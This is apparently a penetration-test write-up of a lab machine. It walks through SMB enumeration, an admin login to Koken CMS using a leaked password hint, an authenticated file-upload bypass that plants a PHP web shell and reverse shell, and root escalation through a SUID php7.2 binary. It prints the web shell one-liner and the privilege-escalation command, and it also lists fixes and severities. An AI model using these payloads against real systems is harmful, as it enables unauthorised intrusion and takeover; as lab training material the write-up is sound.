**Vulnerable System**: 
=======================

**Operating System**: Ubuntu 16.04

**Kernel**: 4.15.0

**Vulnerability Exploited**: Arbitrary File Upload â€“ Remote Code Execution

**Exploit Used**: Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)

**Proof of Concept Code**: <https://www.exploit-db.com/exploits/48706>

**Vulnerability Explained**: The vulnerability in Koken CMS enables an attacker
to upload a malicious file due to file extension only being checked in the front
end and not in the back end. Due to this vulnerability it is possible to upload
a php file, which then can be used for remote code execution (RCE) in order to
obtain a reverse shell.

**Vulnerability fix**: On top of checking file extension in the front end the
application should also check the file extension on the back end (along with
checking the contents of the file), ensuring only whitelisted file types are
allowed to be uploaded.

**Severity**: **medium**

**Privilege Escalation Vulnerability**: SUID /usr/bin/php7.2 Binary

**Exploit Used**: N/A

**Proof of Concept Code**: /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"

**Privilege Escalation Vulnerability Explained:** SUID aka Set User ID, is a
feature in Linux type operating systems, which allows to execute the file with
permissions of specified user, in this case the user being root. Although some
programs require to be ran with root level permissions, such as ping, in this
case there is no reason to grant php executable root level permissions. Due to
php language being able to execute system level commands, an attacker can simply
use php to spawn a new shell, which will automatically has root level
permissions.

**Vulnerability fix**: Keep proper inventory and account for all SUID binaries
with root level permissions, and ensure only binaries that obsoletely need root
level SUID permissions have them.

**Severity**: **High**

### Host Discovery (arp-scan)

arp-scan -l -I eth1

Interface: eth1, type: EN10MB, MAC: 00:0c:29:b1:2e:84, IPv4: 192.168.211.140

#### Aggressive, Version and Default Script Scan.

A more thorough scan of the found ports reveals that there are 2 different web
ports and two SMB related ports. It can be seen that SMB is accessible by guest
user, meaning it can be accessed without credentials. Another interesting thing
to note from the scan above is application version running on port 8000 - Koken
0.22.24.

### SMB Enumeration (smbclient)

When enumerating the SMB shares with smbclient, it can be seen that one share
stands out - sambashare.

smbclient -L \\\\192.168.211.152

Enter WORKGROUP\\root's password:

Sharename Type Comment

\--------- ---- -------

print\$ Disk Printer Drivers

sambashare Disk Samba on Ubuntu

IPC\$ IPC IPC Service (photographer server (Samba, Ubuntu))

SMB1 disabled -- no workgroup available

When browsing through the share there are 2 files mailsent.txt and
wordpress.bkp.zip, both are downloaded and inspected.

smbclient \\\\\\\\192.168.211.152\\\\sambashare

Enter WORKGROUP\\root's password:

Try "help" to get a list of possible commands.

smb: \\\> ls

(average 3.5 KiloBytes/sec)

getting file \\wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (32701.5
KiloBytes/sec) (average 24512.3 KiloBytes/sec)

When analyzing mailsent.txt with cat utility, a few interesting things pop up:

Two email addresses: <agi@photographer.com> and <daisa@photographer.com>

What seems to be a password hint of some sort: Don't forget your secret, my
babygirl ;)

cat mailsent.txt

Hi Daisa!

Your site is ready now.

Don't forget your secret, my babygirl ;)

### Web Port Enumeration (browser)

Once finished with SMB, next step is to enumerate interesting the web ports.
Nothing interesting was found on port 80, however port 8000, as we know from the
portscan, is hosting Koken CMS. Below on the screenshot is the home page of the
application.

![](media/94b8547bce6fce84e4bec804fb9a346c.png)

By a hunch, /admin folder was typed into the URL, and it seems there is a login
form that needs an email and a password. Both of these pieces of information
were contained in the email that was discovered earlier, username being
<daisa@photographer.com> and password being babygirl.

Low Privilege Exploitation
--------------------------

#### Searchsploit/Exploit-DB

Next searchsploit is used to check if there are any exploits for this particular
software, and it turns out there is a file upload exploit.

searchsploit Koken 0.22.24

\-------------------------------------------------------------------------
---------------------------------

Exploit Title \| Path

\-------------------------------------------------------------------------

\-------------------------------------------------------------------------
---------------------------------

Shellcodes: No Results

Papers: No Results

To get more information about the exploit -p flag is used with searchsploit.
This provides URL for the exploit along with the Path of the local copy.
Searchsploit -p also copies the local path to the clip board, which is very
convenient when using cat to display the contents.

searchsploit -p 48706

\# Exploit Title: Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)

\# Date: 2020-07-15

\# Exploit Author: v1n1v131r4

\# Vendor Homepage: http://koken.me/

\# Software Link: https://www.softaculous.com/apps/cms/Koken

\# Version: 0.22.24

\# Tested on: Linux

\# PoC:
https://github.com/V1n1v131r4/Bypass-File-Upload-on-Koken-CMS/blob/master/README.md

The Koken CMS upload restrictions are based on a list of allowed file extensions
(withelist), which facilitates bypass through the handling of the HTTP request
via Burp.

Steps to exploit:

1. Create a malicious PHP file with this content:

\<?php system(\$_GET['cmd']);?\>

2. Save as "image.php.jpg"

3. Authenticated, go to Koken CMS Dashboard, upload your file on "Import
Content" button (Library panel) and send the HTTP request to Burp.

4. On Burp, rename your file to "image.php"

#### RCE via Arbitrary File Upload

Following the exploit steps, instead of creating a malicious php file an already
prepared reverse shell can be used, which is found at
/usr/share/webshells/php/php-reverse-shell.php on Kali Linux. Three changes that
need to be done are changing the file extension to .jpg and the IP address and
port number inside the file to the one of your attacker machineâ€™s IP address and
listening port.

cp /usr/share/webshells/php/php-reverse-shell.php rs.php.jpg

![](media/a5fbad12bff572ad736f5b78ffa5f50f.png)

When uploading the file, intercept HTTP request with a web proxy, in this case
it was Burp Suite Community Edition and change the file extension back to php.

![](media/241db35dde081c124799314c15f94ba8.png)

#### Reverse Shell

Once that is done use netcat to listen on a port of choice, in this case it was
port 8080 and user browser to browse to the fileâ€™s location. Once the reverse
shell is obtained, upgrade the shell to tty using python. The user flag can be
found in /home/daisa/user.txt

![](media/430fc36bd9bf46bd7168b0099d044da0.png)

Privilege Escalation
--------------------

#### Enumeration

Find utility was used to discover SUID files, with one of them being
/usr/bin/php7.2.

#### Escalation

/usr/bin/php7.2 is then used to summon a new shell by executing an OS command
/bin/sh with a -p flag to make it privileged..

/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
